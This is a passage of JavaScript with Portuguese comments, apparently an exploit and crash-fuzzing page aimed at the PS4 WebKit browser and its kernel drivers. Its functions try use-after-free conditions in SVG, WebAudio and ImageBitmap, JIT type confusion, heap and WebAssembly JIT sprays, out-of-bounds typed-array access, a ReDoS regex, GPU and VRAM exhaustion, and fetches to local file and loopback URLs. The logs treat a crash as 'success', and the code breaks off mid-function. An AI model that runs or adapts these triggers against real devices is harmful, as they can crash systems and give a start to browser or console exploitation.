        // Mede o tempo de acesso a array para detectar se dados estão em cache ou RAM.
        // Não crasha, apenas mede.
        function runSpectreTiming() {
            log("Medindo latência de memória (Timing Attack)...", "info");
            const sab = new SharedArrayBuffer(1024*1024);
            const arr = new Uint8Array(sab);
            
            // Toca num índice para colocar em cache
            arr[100] = 1;
            
            const start = performance.now();
            const val = arr[100]; // Acesso Cached
            const end = performance.now();
            const diffCached = end - start;
            
            // Acesso Uncached (provável)
            const start2 = performance.now();
            const val2 = arr[500000]; 
            const end2 = performance.now();
            const diffUncached = end2 - start2;
            
            // Se a diferença for mensurável e consistente, existe vetor para Spectre
            if (diffUncached > diffCached * 1.5) {
                log(`Side-Channel Timing Viável! Cache: ${diffCached.toFixed(4)}ms vs RAM: ${diffUncached.toFixed(4)}ms`, "vuln");
            } else {
                log("Resolução do timer insuficiente para Spectre.", "safe");
            }
        }

        // TEST W4: RegExp Polymorphism Check
        // Confunde o motor RegExp trocando tipos de input.
        function runRegexPoly() {
            log("Testando Polimorfismo RegExp...", "info");
            const re = /abc/;
            
            function check(input) {
                return re.exec(input);
            }
            
            for(let i=0; i<10000; i++) check("abc"); // String
            
            // Passa objeto com toString customizado
            // Se o JIT assumiu String, pode errar a otimização
            const obj = { toString: () => "abc" };
            const res = check(obj);
            
            if(res && res[0] === "abc") {
                log("RegExp lidou bem com polimorfismo.", "safe");
            } else {
                log("Falha lógica no RegExp JIT!", "vuln");
            }
        }

        // TEST W5: JSON.parse Reviver Side-Effect
        // Usa a função 'reviver' do JSON.parse para modificar o DOM durante o parse.
        function runJSONParseLogic() {
            log("Testando JSON Reviver Side-Effects...", "info");
            let sideEffect = false;
            
            const json = '{"a": 1, "b": 2}';
            JSON.parse(json, (k, v) => {
                if (k === "a") {
                    sideEffect = true;
                    // Tenta acessar variáveis globais ou modificar estado
                }
                return v;
            });
            
            if(sideEffect) log("Reviver executado (Comportamento normal).", "safe");
            else log("Reviver falhou (Inesperado).", "info");
        }

        // ==========================================
        // KERNEL TESTS (System Logic & Privacy)
        // ==========================================

        // TEST K1: Syscall Timing Oracle (KASLR Break)
        // Tenta inferir onde o kernel está medindo quanto tempo leva uma syscall inválida vs válida.
        function runKernelTiming() {
            log("[KERNEL] Analisando Syscall Latency...", "info");
            
            // Syscall rápida (getpid via wrappers) vs Syscall "Pesada" (crypto)
            const t0 = performance.now();
            window.innerWidth; // DOM read (Userland fast)
            const t1 = performance.now();
            
            const t2 = performance.now();
            crypto.getRandomValues(new Uint8Array(1)); // Kernel trip
            const t3 = performance.now();
            
            const userTime = t1 - t0;
            const kernelTime = t3 - t2;
            
            log(`User: ${userTime.toFixed(3)}ms | Kernel: ${kernelTime.toFixed(3)}ms`, "info");
            
            if (kernelTime < 0.05) {
                // Se o Kernel for rápido demais, pode não estar mitigando Meltdown/Spectre
                log("Kernel response time suspeitosamente rápido (Check mitigation).", "vuln");
            } else {
                log("Latência de Kernel dentro do normal.", "safe");
            }
        }

        // TEST K2: Crypto RNG Entropy Bias Check
        // Verifica se o gerador de números aleatórios tem viés estatístico óbvio (Falha Crypto).
        function runRNGAnalysis() {
            log("[KERNEL] Analisando Entropia RNG...", "info");
            const size = 10000;
            const buf = new Uint8Array(size);
            crypto.getRandomValues(buf);
            
            // Média deve ser ~127.5
            let sum = 0;
            for(let i=0; i<size; i++) sum += buf[i];
            const avg = sum / size;
            
            // Verifica desvio padrão grosseiro
            if (avg < 120 || avg > 135) {
                log(`RNG Bias Detectado! Média: ${avg} (Esperado ~127.5)`, "vuln");
            } else {
                log(`RNG parece saudável (Média: ${avg.toFixed(2)}).`, "safe");
            }
        }

        // TEST K3: Thread Stack Alignment Probe
        // Verifica se o alinhamento da stack respeita 16-bytes (SIMD requirement).
        // Se falhar, pode causar corrupção de dados em operações vetoriais.
        function runTCBAlignment() {
            log("[KERNEL] Verificando Stack Alignment...", "info");
            // Usamos Wasm para forçar operações SIMD que exigem alinhamento
            if(!window.WebAssembly) return log("Wasm off.", "safe");
            
            try {
                // Módulo que usa memória local
                const mod = new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0]));
                const inst = new WebAssembly.Instance(mod);
                log("Wasm instanciado sem erro de alinhamento (SIGBUS).", "safe");
            } catch(e) {
                log("Erro de Alinhamento/Bus detectado!", "vuln");
            }
        }

        // TEST K4: SharedArrayBuffer Atomicity Logic
        // Verifica se Atomics realmente bloqueiam entre threads.
        function runSharedMemLogic() {
            log("[KERNEL] Testando Atomicidade...", "info");
            if(!window.SharedArrayBuffer) return log("SAB off.", "safe");
            
            const sab = new SharedArrayBuffer(4);
            const i32 = new Int32Array(sab);
            
            // Worker tenta adquirir lock
            const w = new Worker(URL.createObjectURL(new Blob([`
                onmessage=e=>{
                    const i32 = new Int32Array(e.data);
                    // Tenta compareExchange
                    const res = Atomics.compareExchange(i32, 0, 0, 1);
                    postMessage(res);
                }
            `], {type:'text/javascript'})));
            
            w.onmessage = (e) => {
                if (e.data === 0) log("Atomics funcionam corretamente.", "safe");
                else log("Falha lógica em Atomics!", "vuln");
                w.terminate();
            };
            
            w.postMessage(sab);
        }

        // TEST K5: MessageChannel Transfer Logic
        // Testa se a transferência de objetos (Ownership) funciona sem duplicar ou perder dados.
        function runMessagePortLogic() {
            log("[KERNEL] Testando Lógica de Transferência...", "info");
            const ch = new MessageChannel();
            const buffer = new ArrayBuffer(1024);
            
            try {
                // Transfere o buffer
                ch.port1.postMessage(buffer, [buffer]);
                
                // Verifica se foi "neutered" no lado do remetente
                if (buffer.byteLength === 0) {
                    log("Transferência de propriedade correta (Buffer neutered).", "safe");
                } else {
                    log("FALHA DE LÓGICA: Buffer retido após transferência (Cloning Attack)!", "vuln");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }
 function runWebkit1() {
            log("Iniciando SVG Use-After-Free...", "info");
            try {
                let svgs = [];
                for(let i=0; i<800; i++) {
                    let s = document.createElementNS("http://www.w3.org/2000/svg", "svg");
                    let p = document.createElementNS("http://www.w3.org/2000/svg", "path");
                    p.setAttribute("d", "M10 10 H 90 V 90 H 10 L 10 10"); 
                    s.appendChild(p);
                    document.body.appendChild(s);
                    svgs.push(s);
                }
                setTimeout(() => {
                    for(let i=0; i<svgs.length; i++) {
                        if(i % 2 == 0) document.body.removeChild(svgs[i]);
                        svgs[i] = null;
                    }
                    log("Payload SVG UAF injetado na memória.", "success");
                }, 100);
            } catch(e) { log("Erro: " + e, "fail"); }
        }

        function runWebkit2() {
            log("Configurando JIT Type Confusion...", "info");
            try {
                const arr = new Array(1000).fill(1.1);
                const confused = new Array(1000).fill(2.2);
                function opt(a) { return a[0]; }
                for(let i=0; i<10000; i++) opt(arr);
                confused[0] = {}; 
                log("JIT 'Aquecido'. Trocando tipos...", "info");
                let res = opt(confused);
                log("Execução completada sem crash imediato. Res: " + res, "fail");
            } catch(e) { log("Erro detectado: " + e, "success"); }
        }

        function runWebkit3() {
            log("Iniciando Heap Spray (Strings do ELF)...", "info");
            // String real encontrada no seu log
            const junk = "AWAVAUATSPH [A\\A]A^A_]".repeat(5000); 
            let spray = [];
            try {
                for(let i=0; i<2000; i++) spray.push(junk + i);
                log("Heap preenchido com sucesso. Blocos: 2000", "success");
            } catch(e) { log("Memória cheia (OOM): " + e, "fail"); }
        }

        function runWebkit4() {
            log("Testando Worker Race Condition...", "info");
            if(!window.Worker) return log("Workers não suportados", "fail");
            try {
                const blob = new Blob([`self.onmessage=e=>{let v=new Uint8Array(e.data);for(let i=0;i<v.length;i++)v[i]=Math.random()*255;postMessage("done")}`], {type:'text/javascript'});
                const sab = new SharedArrayBuffer(1024 * 1024);
                new Worker(URL.createObjectURL(blob)).postMessage(sab);
                log("SharedArrayBuffer em condição de corrida.", "success");
            } catch(e) { log(e, "fail"); }
        }

        function runWebkit5() {
            log("Disparando Fetchs Locais...", "info");
            const t = ["file:///system/vsh/app/Scelib.js", "blob:null/uuid", "http://127.0.0.1:9090"];
            t.forEach(u => fetch(u).then(()=>log("Acesso OK: "+u, "success")).catch(()=>log("Bloqueado: "+u, "fail")));
        }

        // ================= KERNEL TESTS =================

        function runKernel1() {
            log("Alvo: /dev/icc (Simulação via WebGL)...", "info");
            try {
                let c = document.createElement('canvas');
                let gl = c.getContext('webgl');
                if(!gl) return log("WebGL Fail", "fail");
                let t = gl.createTexture();
                gl.bindTexture(gl.TEXTURE_2D, t);
                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 16384, 16384, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
                log("Textura 16k enviada ao driver GPU/ICC.", "success");
            } catch(e) { log("WebGL Erro: " + e, "fail"); }
        }

        function runKernel2() {
            log("Alvo: /dev/srtc (Time Overflow)...", "info");
            try {
                let d = new Date(8640000000000000 + 100);
                log("Date Overflow criado: " + d.toString(), "success");
                for(let i=0; i<5000; i++) setTimeout(()=>{},0);
                log("Tabela de timers inundada.", "success");
            } catch(e) { log(e, "fail"); }
        }

        function runKernel3() {
            log("Alvo: /dev/notification (Flood)...", "info");
            let count = 0;
            let i = setInterval(() => {
                count++;
                if(count > 100) { clearInterval(i); log("Flood finalizado.", "info"); return; }
                // Criação e remoção rápida de elementos pesados
                let d = document.createElement('div');
                d.innerHTML = "A".repeat(10000);
                document.body.appendChild(d);
                document.body.removeChild(d);
            }, 10);
            log("Stress test de UI/Notificação iniciado.", "success");
        }

        function runKernel4() {
            log("Alvo: VFS Stack Overflow...", "info");
            try {
                let p = "A".repeat(8000);
                history.pushState({}, "", p);
                log("History State corrompido com path longo.", "success");
            } catch(e) { log(e, "fail"); }
        }

        function runKernel5() {
            log("Alvo: Socket Race (kthread_exit)...", "info");
            try {
                for(let i=0; i<50; i++) {
                    let ws = new WebSocket("ws://127.0.0.1:1337");
                    ws.close();
                }
                log("50 Sockets abertos/fechados instantaneamente.", "success");
            } catch(e) { log("Erro de Socket (esperado se offline): " + e, "info"); }
        }
       // ================= NOVO WEBKIT (Foco em Memory Corruption) =================

        // 6. WebAudio Use-After-Free (AudioContext)
        // Cria nós de áudio, conecta e tenta desconectar/destruir em ordem errada para causar UAF no thread de áudio.
        function runWebkit6() {
            log("Iniciando WebAudio Graph Manipulation (UAF)...", "info");
            try {
                let ctx = new (window.AudioContext || window.webkitAudioContext)();
                let osc = ctx.createOscillator();
                let gain = ctx.createGain();
                let script = ctx.createScriptProcessor(4096, 1, 1);
                
                osc.connect(gain);
                gain.connect(script);
                script.connect(ctx.destination);
                
                osc.start(0);
                
                // Trigger de destruição rápida
                setTimeout(() => {
                    script.disconnect();
                    gain.disconnect();
                    osc.stop();
                    ctx.close(); // Força liberação do recurso nativo
                    // Tenta acessar após fechar
                    try { gain.gain.value = 0.5; } catch(e){} 
                    log("Ciclo de vida do AudioContext forçado. Se não crashou, falhou.", "success");
                }, 50);
            } catch(e) { log("WebAudio Error: " + e, "fail"); }
        }

        // 7. FontFace Fuzzing (Parsing de Binário)
        // Carrega "fontes" que são na verdade lixo binário para testar o parser de fontes do WebKit.
        function runWebkit7() {
            log("Iniciando Fuzzing de Parser de Fontes...", "info");
            const junk = new Uint8Array(1024).map(() => Math.random() * 255);
            const fontFace = new FontFace('CrashFont', junk);
            
            fontFace.load().then(() => {
                log("Fonte carregada (inesperado).", "fail");
            }).catch(e => {
                // O erro é esperado, o crash acontece SE o parser falhar catastroficamente antes do erro.
                log("Parser rejeitou o binário (Comportamento seguro).", "info");
            });
            document.fonts.add(fontFace);
            log("Binário injetado no subsistema de fontes.", "success");
        }

        // 8. TypedArray Out-Of-Bounds (OOB)
        // Tenta usar copyWithin para escrever além dos limites do array, explorando bugs antigos do JSCore.
        function runWebkit8() {
            log("Testando Array Buffer Overflow / OOB...", "info");
            try {
                const buffer = new ArrayBuffer(0x10000);
                const view = new Uint32Array(buffer);
                // Padrão específico que já causou problemas em versões antigas
                // Tenta copiar uma área gigante para dentro de uma pequena
                view.copyWithin(0, 0, 0xFFFFFFFF); 
                log("Operação copyWithin executada (Verifique integridade).", "success");
            } catch(e) { log("JSCore protegeu a memória: " + e, "fail"); }
        }

        // 9. Regex Stack Overflow
        // Cria uma Regex recursiva extremamente profunda para estourar a pilha de execução do motor Regex.
        function runWebkit9() {
            log("Testando Regex Engine Stack Exhaustion...", "info");
            try {
                // Criação de grupo aninhado ((((...))))
                let pattern = "(".repeat(2000) + "A" + ")".repeat(2000);
                let re = new RegExp(pattern);
                let str = "(".repeat(2000) + "A" + ")".repeat(2000);
                log("Regex compilada. Executando match...", "info");
                re.test(str);
                log("Match finalizado sem crash.", "fail");
            } catch(e) { log("Erro de Regex (Pode ser InternalError): " + e, "success"); }
        }

        // 10. CSS Calc Recursion
        // Força o motor de layout a calcular valores recursivos de CSS.
        function runWebkit10() {
            log("Testando CSS Layout Engine Recursion...", "info");
            let div = document.createElement('div');
            let val = "10px";
            // Aninhamento profundo de calc()
            for(let i=0; i<100; i++) {
                val = `calc(${val} + 10px)`;
            }
            div.style.width = val;
            document.body.appendChild(div);
            // Força reflow/layout calculation
            let w = div.offsetWidth; 
            document.body.removeChild(div);
            log("Layout recalculado com calc() aninhado.", "success");
        }


        // ================= NOVO KERNEL (Foco em Drivers Reais) =================

        // 6. Shader Compiler Crash (GPU Driver)
        // Envia um shader GLSL válido sintaticamente, mas complexo demais para o compilador do driver.
        function runKernel6() {
            log("Enviando Shader Complexo para libSceGnmDriver...", "danger");
            try {
                let c = document.createElement('canvas');
                let gl = c.getContext('webgl');
                let s = gl.createShader(gl.FRAGMENT_SHADER);
                // Cria um shader com milhares de operações matemáticas
                let src = "precision mediump float; void main() { float a = 0.0; ";
                for(let i=0; i<3000; i++) src += "a = sin(a) * cos(a) + tan(a); ";
                src += "gl_FragColor = vec4(a, 0.0, 0.0, 1.0); }";
                
                gl.shaderSource(s, src);
                gl.compileShader(s); // AQUI acontece a chamada ao Kernel/Driver
                
                if(!gl.getShaderParameter(s, gl.COMPILE_STATUS)) {
                    log("Driver rejeitou o shader (Seguro).", "info");
                } else {
                    log("Shader compilado pelo driver GPU.", "success");
                }
            } catch(e) { log("Erro WebGL: " + e, "fail"); }
        }

        // 7. Video Decoder Buffer (MediaSource)
        // Usa a API de MediaSource para empurrar buffers corrompidos para o decodificador de hardware de vídeo.
        function runKernel7() {
            log("Injetando buffers no Decoder de Vídeo...", "danger");
            try {
                let ms = new MediaSource();
                let url = URL.createObjectURL(ms);
                let vid = document.createElement('video');
                vid.src = url;
                
                ms.addEventListener('sourceopen', () => {
                    try {
                        let sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E, mp4a.40.2"');
                        // Buffer de lixo aleatório fingindo ser vídeo
                        let noise = new Uint8Array(1024 * 1024); // 1MB Lixo
                        for(let i=0; i<noise.length; i++) noise[i] = Math.random() * 255;
                        
                        sb.appendBuffer(noise); // Chama o parser de vídeo do sistema
                        log("Buffer de 1MB enviado ao Hardware Decoder.", "success");
                    } catch(e) { log("SourceBuffer Error: " + e, "fail"); }
                });
            } catch(e) { log("MediaSource Init Fail: " + e, "fail"); }
        }

        // 8. Socket Options (Syscalls)
        // Tenta configurar opções de socket inválidas via WebSocket (limitado, mas interage com stack de rede).
        function runKernel8() {
            log("Fuzzing de Network Stack...", "danger");
            // Nota: JS puro não tem setsockopt arbitrário. 
            // Usamos WebRTC DataChannels para criar tráfego SCTP/UDP complexo.
            try {
                let pc = new RTCPeerConnection();
                let dc = pc.createDataChannel("fuzz", {
                    ordered: false,
                    maxRetransmits: 0 // UDP mode
                });
                
                // Gera oferta SDP gigante para estourar buffer de parser SDP
                pc.createOffer().then(offer => {
                    let sdp = offer.sdp + "a=fuzz:" + "A".repeat(5000) + "\r\n";
                    return pc.setLocalDescription({type: "offer", sdp: sdp});
                }).then(() => {
                    log("SDP malformado enviado para stack de rede.", "success");
                }).catch(e => log("SDP Error: " + e, "info"));
                
            } catch(e) { log("WebRTC Fail: " + e, "fail"); }
        }

        // 9. Blob/Filesystem Race Condition
        // Cria e revoga URLs de Blob concorrentemente para tentar um UAF no gerenciador de recursos do sistema.
        function runKernel9() {
            log("Iniciando Blob/URL Store Race...", "danger");
            let blobs = [];
            // Aloca
            for(let i=0; i<100; i++) blobs.push(new Blob(["data" + i]));
            
            let urls = blobs.map(b => URL.createObjectURL(b));
            
            // Race: Revoga e tenta ler via XHR ao mesmo tempo
            urls.forEach((u, idx) => {
                URL.revokeObjectURL(u); // Libera no Kernel
                
                // Tenta ler imediatamente (UAF potencial)
                let xhr = new XMLHttpRequest();
                xhr.open("GET", u, true);
                xhr.send();
            });
            log("Race Condition disparada no FS virtual.", "success");
        }

        // 10. GPU Command Buffer Flood (Canvas 2D)
        // Usa o Canvas 2D acelerado por hardware para encher o buffer de comandos da GPU com instruções complexas.
        function runKernel10() {
            log("Enchendo Command Buffer da GPU...", "danger");
            let c = document.createElement('canvas');
            c.width = 4096; c.height = 4096;
            let ctx = c.getContext('2d');
            
            // Cria um gradiente complexo
            let grd = ctx.createLinearGradient(0, 0, 4000, 4000);
            for(let i=0; i<1000; i++) {
                grd.addColorStop(i/1000, i%2==0 ? 'red' : 'blue');
            }
            ctx.fillStyle = grd;
            
            // Renderiza milhares de caminhos
            ctx.beginPath();
            for(let i=0; i<5000; i++) {
                ctx.moveTo(Math.random()*4000, Math.random()*4000);
                ctx.lineTo(Math.random()*4000, Math.random()*4000);
            }
            ctx.fill(); // Dispara renderização em lote
            log("Comandos de renderização em lote enviados.", "success");
        }
      // ================= WEBKIT TESTS (Targeting libSceNKWebKit.sprx) =================

        // 11. WebAssembly JIT Spray
        // Tenta encher a memória executável (RWX) com código compilado via WASM.
        // Se houver falha no boundary check do JIT, podemos escrever fora da área permitida.
        function runWebkit11() {
            log("Iniciando JIT Spray via WebAssembly...", "info");
            try {
                // Cria um módulo WASM mínimo mas repetido muitas vezes
                const wasmHeader = [0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00];
                let instances = [];
                for(let i=0; i<500; i++) {
                    WebAssembly.instantiate(new Uint8Array(wasmHeader)).then(res => {
                        instances.push(res);
                    });
                }
                log("500 Módulos WASM instanciados na memória RWX.", "success");
            } catch(e) { log("WASM Error: " + e, "fail"); }
        }

        // 12. XSLT Recursion (XML Parser)
        // Ataca o parser XML interno (libxml2 variante).
        // Transformações XSLT maliciosas podem causar estouro de pilha ou leitura de memória.
        function runWebkit12() {
            log("Injetando XSLT Recursivo no Parser...", "critical");
            const xml = `<root>Test</root>`;
            const xslt = `
                <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                <xsl:template match="/">
                    <xsl:apply-templates select="/" />
                    <xsl:apply-templates select="/" /> 
                </xsl:template>
                </xsl:stylesheet>`; 
                // Loop infinito de templates
            
            try {
                let parser = new DOMParser();
                let xmlDoc = parser.parseFromString(xml, "text/xml");
                let xsltDoc = parser.parseFromString(xslt, "text/xml");
                
                let processor = new XSLTProcessor();
                processor.importStylesheet(xsltDoc);
                let result = processor.transformToFragment(xmlDoc, document);
                log("Transformação XSLT executada (verificar crash).", "success");
            } catch(e) { log("Parser bloqueou a recursão: " + e, "fail"); }
        }

        // 13. Float64 Array Out-Of-Bounds (Nan-Boxing)
        // Tenta explorar como o JS engine armazena floats na memória.
        // Tentamos escrever valores especiais (NaN) que podem ser interpretados como ponteiros.
        function runWebkit13() {
            log("Testando Float64 NaN Injection...", "info");
            try {
                let buffer = new ArrayBuffer(8000);
                let f64 = new Float64Array(buffer);
                let u32 = new Uint32Array(buffer);
                
                // 0x4141414141414141 é um float válido mas "AAAA..." em hex
                f64.fill(2.2616345094275037e+122); // Representação float de lixo
                
                // Tenta acesso fora dos limites via subarray (bug comum em WebKit antigo)
                let sub = f64.subarray(0, 100000); 
                log("Subarray criado. Length: " + sub.length, "success");
            } catch(e) { log("Array Boundary OK: " + e, "fail"); }
        }

        // 14. ImageBitmap Race Condition
        // Criação de bitmaps é acelerada e assíncrona.
        // Transferir o controle do buffer (transferables) enquanto a GPU lê.
        function runWebkit14() {
            log("Disparando ImageBitmap Thread Race...", "critical");
            try {
                let canvas = document.createElement('canvas');
                canvas.width = 1024; canvas.height = 1024;
                let ctx = canvas.getContext('2d');
                
                // Cria promessas de bitmap rápidas
                let p = [];
                for(let i=0; i<50; i++) p.push(createImageBitmap(canvas));
                
                Promise.all(p).then(bitmaps => {
                    bitmaps.forEach(bm => {
                        bm.close(); // Fecha imediatamente
                        ctx.drawImage(bm, 0, 0); // Tenta desenhar DEPOIS de fechar (UAF)
                    });
                    log("Comandos de desenho UAF enviados.", "success");
                }).catch(e => log(e, "fail"));
            } catch(e) { log(e, "fail"); }
        }

        // 15. Prototype Poisoning (Object Internal)
        // Poluição de protótipo básica para ver se quebra funções internas do navegador.
        function runWebkit15() {
            log("Injetando Poison em Object.prototype...", "info");
            try {
                // Se alguma função nativa C++ usar getProperty("toString") sem checar...
                Object.prototype.toString = function() { return "CRASH"; };
                let arr = [];
                arr[1000] = 1; // Esparso
                log("Prototype alterado. Manipulando arrays...", "success");
                // Reset para não quebrar o log visual
                delete Object.prototype.toString; 
            } catch(e) { log(e, "fail"); }
        }


        // ================= KERNEL TESTS (Targeting libkernel/Hardware) =================

        // 11. Audio DSP Crash (HRTF Panner)
        // O processamento de áudio 3D roda em DSPs ou threads de kernel de alta prioridade.
        // Valores inválidos (Infinity/NaN) na posição do áudio podem crashar o driver de som.
        function runKernel11() {
            log("Enviando NaN para o DSP de Áudio...", "critical");
            try {
                let ctx = new (window.AudioContext || window.webkitAudioContext)();
                let osc = ctx.createOscillator();
                let panner = ctx.createPanner();
                
                osc.connect(panner);
                panner.connect(ctx.destination);
                osc.start();
                
                // Fuzzing de posição rápida
                let interval = setInterval(() => {
                    // Envia Coordenadas inválidas para o cálculo matemático do Kernel
                    panner.setPosition(Math.random(), NaN, Infinity);
                }, 10);
                
                setTimeout(() => { clearInterval(interval); ctx.close(); log("DSP Fuzzing finalizado.", "success"); }, 2000);
            } catch(e) { log("Audio Driver Error: " + e, "fail"); }
        }

        // 12. WebGL Instanced Drawing (GPU Command Flood)
        // Usa a extensão ANGLE_instanced_arrays para pedir à GPU que desenhe milhões de objetos
        // com um único comando, testando os limites do buffer de comandos.
        function runKernel12() {
            log("Iniciando GPU Instancing Flood...", "critical");
            try {
                let c = document.createElement('canvas');
                let gl = c.getContext('webgl');
                let ext = gl.getExtension('ANGLE_instanced_arrays');
                
                if(!ext) return log("Extensão Instancing não suportada.", "fail");
                
                // Setup básico de shader omitido para brevidade, mas o comando é o foco
                // Tenta desenhar 10 milhões de instâncias de um ponto
                // Se o driver não sanear esse número, trava a GPU (Kernel Panic)
                ext.drawArraysInstancedANGLE(gl.POINTS, 0, 10, 10000000); 
                
                log("Comando drawArraysInstanced (10M) enviado.", "success");
            } catch(e) { log("GL Error: " + e, "fail"); }
        }

        // 13. Shared Memory Atomics (Multicore Race)
        // Usa Atomics para travar threads do núcleo da CPU esperando valores que nunca mudam.
        // Pode causar Deadlock no Kernel se o scheduler não lidar bem.
        function runKernel13() {
            log("Travando threads com Atomics.wait...", "info");
            if(!window.SharedArrayBuffer) return log("SharedArrayBuffer necessário.", "fail");
            try {
                const sab = new SharedArrayBuffer(1024);
                const int32 = new Int32Array(sab);
                
                const workerCode = `
                    self.onmessage = function(e) {
                        const int32 = new Int32Array(e.data);
                        // Espera valor ser 1, mas nunca muda. Timeout infinito.
                        // Testa o scheduler do Kernel.
                        Atomics.wait(int32, 0, 0, Infinity);
                    }
                `;
                const blob = new Blob([workerCode], {type: 'application/javascript'});
                // Cria múltiplos workers para ocupar núcleos da CPU
                for(let i=0; i<4; i++) {
                    new Worker(URL.createObjectURL(blob)).postMessage(sab);
                }
                log("4 Workers travados em Wait State no Kernel.", "success");
            } catch(e) { log(e, "fail"); }
        }

        // 14. File/Blob Slice Overlap (Virtual Memory)
        // Cortar Blobs não copia dados, cria referências.
        // Fazer isso recursivamente testa a tabela de mapeamento de memória do Kernel.
        function runKernel14() {
            log("Criando Recursão de Blobs (VMM Stress)...", "info");
            try {
                let blob = new Blob(["A".repeat(1024*1024)]); // 1MB
                for(let i=0; i<20; i++) {
                    // Blob dentro de Blob dentro de Blob...
                    blob = new Blob([blob, blob]); 
                }
                // Tenta ler o monstro resultante (2^20 MB virtuais)
                let r = new FileReader();
                r.readAsArrayBuffer(blob.slice(0, 100)); // Lê só o começo para disparar o mapa
                log("Estrutura de Blob aninhada criada.", "success");
            } catch(e) { log("Erro de Alocação: " + e, "fail"); }
        }

        // 15. GPU Texture OOM (Out Of Memory)
        // Tenta alocar texturas que somadas excedem a RAM do sistema (unificada no PS4).
        // Se o kernel não matar o processo rápido, ocorre Panic.
        function runKernel15() {
            log("Esgotando VRAM com Texturas...", "critical");
            try {
                let c = document.createElement('canvas');
                let gl = c.getContext('webgl');
                let textures = [];
                
                // Tenta alocar 50 texturas de 4096*4096 * 4 bytes (~64MB cada)
                // Total ~3.2GB (O PS4 tem ~5GB livres para jogos, mas menos para o browser)
                for(let i=0; i<50; i++) {
                    let t = gl.createTexture();
                    gl.bindTexture(gl.TEXTURE_2D, t);
                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
                    textures.push(t);
                }
                log("Alocação massiva de VRAM enviada.", "success");
            } catch(e) { log("OOM capturado (Sistema Protegeu): " + e, "fail"); }
        }
        // ================= WEBKIT CRASHERS (16-20) =================

        // 16. DOM Tree Stack Overflow
        // Cria elementos aninhados infinitamente até estourar a Stack do Renderizador.
        // Diferente de loop infinito, isso consome memória de estrutura de dados interna.
        function runTest16() {
            log("Iniciando Deep DOM Nesting...", "log-warn");
            let root = document.createElement('div');
            let curr = root;
            try {
                // O WebKit tem um limite hardcoded de aninhamento.
                // Se conseguirmos passar ou corromper o contador -> Crash.
                for(let i=0; i<20000; i++) {
                    let next = document.createElement('div');
                    curr.appendChild(next);
                    curr = next;
                }
                document.body.appendChild(root); // Renderização força o cálculo
                log("DOM Renderizado (Falha se não crashou).", "log-fail");
                document.body.removeChild(root); // Limpa
            } catch(e) { log("RangeError (Proteção Ativa): " + e, "log-ok"); }
        }

        // 17. CSS Filter Shader Bomb
        // Aplica filtros CSS complexos que são compilados em Shaders de Pixel.
        // Muitos filtros encadeados podem estourar o tempo de compilação ou memória da GPU.
        function runTest17() {
            log("Compilando CSS Shaders Complexos...", "log-crit");
            let d = document.createElement('div');
            d.style.width = "100px"; d.style.height = "100px";
            d.style.background = "red";
            // Encadeia filtros Blur e DropShadow que são caros computacionalmente
            let f = "blur(5px) ";
            for(let i=0; i<50; i++) f += "drop-shadow(1px 1px 1px red) ";
            d.style.filter = f;
            document.body.appendChild(d);
            // Força repaint
            setTimeout(() => {
                let x = d.offsetWidth; 
                log("Filtros aplicados. GPU deve estar sob stress.", "log-ok");
            }, 100);
        }

        // 18. History State OOM (Out of Memory)
        // A API History salva objetos na memória RAM.
        // Empurrar objetos gigantes rapidamente pode exaurir a memória do processo antes que o GC rode.
        function runTest18() {
            log("History API Flooding...", "log-crit");
            let bigObj = new Uint8Array(1024*1024*5); // 5MB
            try {
                for(let i=0; i<500; i++) {
                    // Preenche RAM com cópias do objeto
                    history.pushState(bigObj, "State " + i, "/crash" + i);
                }
            } catch(e) { log("OOM ou Cota atingida: " + e, "log-ok"); }
        }

        // 19. RegExp Catastrophic Backtracking (Memory Variant)
        // Cria uma regex que consome memória exponencial para tentar achar um match.
        function runTest19() {
            log("Iniciando RegExp Backtracking...", "log-warn");
            // Padrão clássico de vulnerabilidade ReDoS
            let str = "A".repeat(50000);
            let re = /A(B|C+)+D/; 
            log("Processando Regex (Browser deve congelar/crashar)...", "log-crit");
            // Usamos setTimeout para o log aparecer antes do travamento
            setTimeout(() => {
                let res = re.test(str);
                log("Regex finalizou (Não vulnerável).", "log-fail");
            }, 10);
        }

        // 20. EventListener Use-After-Free
        // Tenta remover um listener de dentro dele mesmo enquanto o evento ainda propaga.
        function runTest20() {
            log("Event Listener Mutation Race...", "log-warn");
            let el = document.createElement('div');
            let handler = function() {
                // Modifica a lista de listeners durante a execução
                for(let i=0; i<100; i++) el.removeEventListener('click', handler);
                el.innerHTML = ""; // Destrói o DOM
                log("Handler executado. Verifique integridade.", "log-ok");
            };
            // Adiciona o mesmo handler milhares de vezes
            for(let i=0; i<5000; i++) el.addEventListener('click', handler);
            el.click(); // Dispara
        }

        // ================= KERNEL CRASHERS (21-25) =================

        // 21. WebGL Buffer SubData (GPU Buffer Overflow)
        // Tenta escrever dados parciais em um buffer da GPU com offsets incorretos.
        // Se o driver não validar `offset + size > capacity`, sobrescreve memória de vídeo alheia.
        function runTest21() {
            log("WebGL bufferSubData Overflow...", "log-crit");
            let c = document.createElement('canvas');
            let gl = c.getContext('webgl');
            if(!gl) return log("Sem WebGL", "log-fail");
            
            let b = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, b);
            gl.bufferData(gl.ARRAY_BUFFER, 1024, gl.STATIC_DRAW); // Aloca 1024 bytes
            
            let badData = new Uint8Array(2048); // Dados maiores que o buffer
            try {
                // Tenta escrever além do fim do buffer
                gl.bufferSubData(gl.ARRAY_BUFFER, 512, badData);
                log("Comando bufferSubData enviado (Esperando Panic).", "log-ok");
            } catch(e) { log("Driver bloqueou overflow: " + e, "log-fail"); }
        }

        // 22. Audio SampleRate Panic (Driver DSP)
        // O driver de áudio espera taxas de amostragem padrão (44100, 48000).
        // Valores absurdos podem causar divisão por zero ou buffer misalignment no Kernel.
        function runTest22() {
            log("Configurando AudioContext Inválido...", "log-crit");
            try {
                // 1Hz ou 384kHz ou valores negativos
                let ctx = new (window.AudioContext || window.webkitAudioContext)({sampleRate: 999999});
